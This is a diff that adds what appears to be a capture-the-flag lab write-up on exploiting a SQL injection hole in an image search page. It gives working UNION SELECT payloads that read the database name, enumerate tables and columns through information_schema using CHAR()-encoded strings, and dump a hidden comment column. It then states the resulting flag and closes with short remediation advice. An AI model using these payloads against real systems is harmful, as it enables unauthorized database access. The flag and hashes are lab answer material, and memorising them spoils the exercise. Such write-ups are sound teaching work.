@@ -1,0 +1,35 @@
+The vunerability is on the searchimg page
+If you try 3, you'll get the result Google, but if you try 1 + 2, you'll get the same result, that mean we'll be able to exec SQL command
+
+Next thing we want to know is the name of the database. To search another thing than the image search, we can use UNION.
+With the usage of database(), we can get the name of the database, so we get the command:
+25 UNION SELECT 1,database()
+================================================================================================================================================================================================================
+We used 25 because we're sure there is nothing as result for 25.
+We get the result: Member_images
+
+
+Now we want to know the name of the tables. We'll use information_schema.TABLES, to get those informations.
+Also, we'll need to use CHAR() because the server doesn't accept Strings. The command is:
+25 UNION SELECT 1, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115)
+================================================================================================================================================================================================================
+And we get only one result: list_images
+
+
+Next step is to know all the columns of that table, so we proceed the same way as before:
+25 UNION SELECT 1, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = CHAR(077,101,109,098,101,114,095,105,109,097,103,101,115) AND TABLE_NAME = CHAR(108,105,115,116,095,105,109,097,103,101,115)
+================================================================================================================================================================================================================
+We get 4 columns: id, url, title and comment
+
+
+For the final part, there is only the comment column that is not display with a normal search, so we'll look what's inside:
+25 UNION SELECT id, comment FROM list_images
+================================================================================================================================================================================================================
+For the id of 5, we get "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
+
+
+if we decode 1928e8083cf461a51303633093573c46, we get albatroz, and if we use sha256 on it, we get the flag:
+f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
+
+how to correct: - just DON'T and NEVER use something like: "SELECT  * FROM users WHERE id : '" + id_not_protected + "'"
+                - there is several different ways to do it safely, like using mysql_real_escape_string(), or use the PDO (if supported)
